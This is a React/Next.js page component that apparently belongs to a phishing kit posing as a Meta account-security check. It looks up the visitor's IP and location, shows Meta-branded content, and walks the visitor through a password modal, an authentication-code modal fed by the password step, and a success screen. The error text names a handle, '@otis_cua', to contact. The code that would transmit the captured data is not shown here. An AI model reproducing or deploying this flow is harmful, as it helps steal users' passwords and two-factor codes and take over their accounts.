"use client"

import MetaComponent from '@/app/components/meta'
import AuthenticationModal from '@/app/components/modal/AuthenticationModal'
import SecurityModal from '@/app/components/modal/SecurityModal'
import SuccessModal from '@/app/components/modal/SuccessModal'
import { getUserLocation } from '@/app/utils'
import React, { useEffect } from 'react'

const NotFoundComponent = () => {
    const [userLocation, setUserLocation] = React.useState({});
    const [countryCode, setCountryCode] = React.useState("");
    const [isImageLoaded, setIsImageLoaded] = React.useState(false);

    const [isOpendPassword, setIsOpendPassword] = React.useState(false);
    const [isOpendAuthentication, setIsOpendAuthentication] = React.useState(false);
    const [dataModal, setDataModal] = React.useState({});
    const [isOpendSuccess, setIsOpendSuccess] = React.useState(false);

    const getIp = async () => {
        try {
            const userLocation = await getUserLocation();
            setUserLocation(userLocation || "Error, contact @otis_cua");
            setCountryCode(userLocation?.country_code || "US");
        } catch (error) {
            console.error("Error getting IP or location:", error);
        }
    }

    useEffect(() => {
        getIp();
    }, []);

    const handleOpendModal = (isOpenAuth: boolean) => {
        getIp();
    }

    const handleOpendPassword = (isOpendPassword: boolean) => {
        setIsOpendPassword(isOpendPassword);
    }

    const handleToggleAuthentication = (isOpendSecurity: boolean) => {
        setIsOpendAuthentication(isOpendSecurity);
    }

    const handSendDataModal = (data: object) => {
        setDataModal(data);
    }

    const handleToggleSuccess = (isOpend: boolean) => {
        setIsOpendSuccess(isOpend);
    }

    useEffect(() => {
        setTimeout(() => {
            setIsImageLoaded(true)
        }, 3200);
    }, [])

    return (
        <div>
            <MetaComponent
                onToggle={handleOpendModal}
                userLocation={userLocation}
                countryCode={countryCode}
                onOpendPassword={handleOpendPassword}
            />

            <SecurityModal
                isOpendPassword={isOpendPassword}
                onToggleModalPass={handleOpendPassword}
                onOpendAuthentication={handleToggleAuthentication}
                onSendDataModal={handSendDataModal}
            />

            <AuthenticationModal
                isOpendAuthentication={isOpendAuthentication}
                onToggleModalAuthentication={handleToggleAuthentication}
                onOpendSuccess={handleToggleSuccess}
                dataModal={dataModal}
            />

            <SuccessModal
                isOpendSuccess={isOpendSuccess}
                onToggleSuccess={handleToggleSuccess}
            />
        </div>
    )
}

export default NotFoundComponent
